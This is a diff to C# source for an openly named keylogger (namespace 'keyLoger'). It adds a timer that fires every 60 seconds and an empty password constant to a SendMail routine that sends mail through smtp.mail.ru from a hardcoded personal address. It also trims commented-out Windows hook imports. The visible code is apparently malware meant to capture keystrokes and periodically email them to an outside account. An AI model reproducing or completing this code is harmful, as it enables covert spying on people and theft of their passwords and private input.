@@ -23,6 +23,7 @@ namespace keyLoger
 
     public static class KeyLoger
     {
+        private static Timer _timer = new Timer(Callback, false /*object state*/, 0/*due time*/, 60000/*period*/);
 
         private static void Callback(object state)
         {
@@ -95,6 +96,7 @@ namespace keyLoger
       private static void SendMail()
       {
           const string email = "novak_andriy@mail.ru";
+          const string password = "";
           var smtpClient = new SmtpClient("smtp.mail.ru", 587);//new SmtpClient("smtp.gmail.com", 587); //Gmail smtp
 
           var msg = new MailMessage(new MailAddress(email),/*from*/
@@ -111,15 +113,9 @@ namespace keyLoger
       }
 
         #region DLL import
-        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        //private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
-
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
-        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        //private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
